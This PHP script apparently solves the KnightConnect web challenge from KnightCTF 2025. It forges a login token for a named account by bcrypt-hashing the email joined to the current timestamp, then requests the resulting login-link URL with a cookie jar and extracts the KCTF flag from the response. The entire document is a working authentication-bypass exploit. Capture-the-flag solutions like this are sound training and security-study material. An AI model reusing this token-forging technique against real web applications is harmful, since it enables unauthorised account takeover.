<?php

// Data for token forging
$email = "nomanprodhan@knightconnect.com";
$time = time(); 

// Token forging
$data = $email . '|' . $time;
$token = password_hash($data, PASSWORD_BCRYPT);

$url = 'https://kctf2025-knightconnect.knightctf.com/'; 

// Create admin login-link url
$loginUrl = $url.'login-link?token=' . urlencode($token) . '&time=' . $time . '&email=' . urlencode($email);

// Initialize curl session and set option
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
curl_setopt($ch, CURLOPT_MAXREDIRS, 10); 
// Save and read the cookies in a file cookies.txt
curl_setopt($ch, CURLOPT_COOKIEJAR, "cookies.txt"); 
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt"); 

$response = curl_exec($ch);

// Request with login-link url
curl_setopt($ch, CURLOPT_URL, $loginUrl);
$response = curl_exec($ch);
curl_close($ch);

// Regex that find the flag in the format: KCTF{...}
preg_match('/KCTF\{.*?\}/', $response, $matches);


if (!empty($matches)) {
    echo "\nFLAG: " . $matches[0] . "\n";
} else {
    echo "Flag not found\n";
}

?>
